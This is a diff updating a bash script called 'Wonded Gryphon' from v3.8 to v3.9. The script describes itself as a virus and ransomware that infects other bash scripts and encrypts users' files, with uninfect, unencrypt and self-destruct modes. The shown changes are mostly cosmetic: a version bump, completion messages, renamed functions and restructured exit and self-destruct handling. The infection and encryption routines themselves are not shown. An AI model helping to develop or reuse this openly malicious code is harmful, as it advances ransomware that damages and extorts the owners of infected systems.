@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v3.8  ______----------- # ---------------
+#      / Wonded Gryphon v3.9  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -40,7 +40,7 @@ CAT=$(cat "$ME")
 
 FLAG="#arrow"
 
-VERSION="v3.8"
+VERSION="v3.9"
 
 FLAG="$1"
 
@@ -140,7 +140,7 @@ On_IWhite='\033[0;107m'   # White
 
 function banner1() {
    
-   echo -e "$Blue                _  #       _ $NC"
+   echo -e "$Blue                _ #      _ $NC"
    echo -e "$Blue              _/|  \ _   |\_ $NC"
    echo -e "$Blue            _/_ |   \|\\ | _\ $NC"
    echo -e "$Blue          _/_/| /  /   \|\ |\_\_     # $NC"
@@ -228,13 +228,13 @@ function banner_text() {
    # This is a virus/ransomware that works on unix systems with bash installed.
    # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
    # $NC
-   $BBlue # If virus mode: $NC
-   $UBlue #
+   $BBlue# If virus mode: $NC
+   $UBlue#
    # Check if files are written in bash then start infecting them.
    # The virus ignores non bash scripts and already infected files
    # $NC
-   $BBlue # If ransomware mode: $NC
-   $UBlue #
+   $BBlue# If ransomware mode: $NC
+   $UBlue#
    # Encrypt files in Desktop, Videos ... $NC"
 }
 
@@ -250,7 +250,7 @@ function error() {
    echo -e "     "
 }
 
-function help() {
+function helpfunction() {
 
    echo -e "$BCyan Available opions: $NC"
    echo -e " "
@@ -355,9 +355,11 @@ function infect() {
       if [ "$@" =~ .*"--self-destruct" ]
 
       then
+         echo -e "$BBlue Done...$NC"
          cleanup
    
       else
+         echo -e "$BBlue Done...$NC"
          exit
    
       fi
@@ -394,15 +396,6 @@ function virus_start() {
    
    check
    
-   if [ "$@" =~ .*"--self-destruct" ]
-   
-   then
-      cleanup
-   
-   else
-      exit
-   
-   fi
 }
 
 # RANSOMWARE MODE
@@ -529,9 +522,11 @@ function ransom_start() {
    if [ "$@" =~ .*"--self-destruct" ]
 
    then
+      echo -e "$BBlue Done...$NC"
       cleanup
    
    else
+      echo -e "$BBlue Done...$NC"
       exit
    
    fi
@@ -608,7 +603,18 @@ function uninfect() {
    if [ "$RINFECTCOUNT" == $MAXINFECTCOUND ]
 
    then
-      echo "Done.."
+   
+      if [ "$@" =~ .*"--self-destruct" ]
+   
+      then
+         echo -e "$BBlue Done...$NC"
+         cleanup
+   
+      else
+         echo -e "$BBlue Done...$NC"
+         exit
+   
+      fi
    
    else
       remcheck
@@ -617,7 +623,7 @@ function uninfect() {
    
 }
 
-function uninfect() {
+function uninfectstart() {
    
    BANNER # Very important :)
 
@@ -625,15 +631,6 @@ function uninfect() {
 
    remcheck
    
-   if [ "$@" =~ .*"--self-destruct" ]
-   
-   then
-      cleanup
-   
-   else
-      exit
-   
-   fi
 }
 
 # Unencrypt
@@ -716,9 +713,11 @@ function unencrypt() {
    if [ "$@" =~ .*"--self-destruct" ]
 
    then
+      echo -e "$BBlue Done...$NC"
       cleanup
    
    else
+      echo -e "$BBlue Done...$NC"
       exit
    
    fi
@@ -747,7 +746,7 @@ then
 elif [ "$FLAG" == "--help" ]
 
 then
-   help
+   helpfunction
    
 elif [ "$FLAG" == "--unencrypt" ]
 
@@ -758,13 +757,13 @@ elif [ $# -le 0 ]
 
 then
    error
-   echo "   "
-   echo -e  "$Red No arguments specified! $NC"
+   echo -e "   "
+   echo -e "$Red No arguments specified! $NC"
    echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC"
 
 else
    error
-   echo "   "
+   echo -e "   "
    echo -e "$Red No such argument available!$NC"
    echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC" 
 
@@ -786,6 +785,7 @@ fi
 #            //`:::`\\
 #           //   '   \\
 #          |/         \\
+#
 # PLEASE DO NOT COPY THE SOURCE CODE OF THIS PROJECT AND RENAME IT
 # THAT'S NOT CREATING THAT IS STEALING.
 #
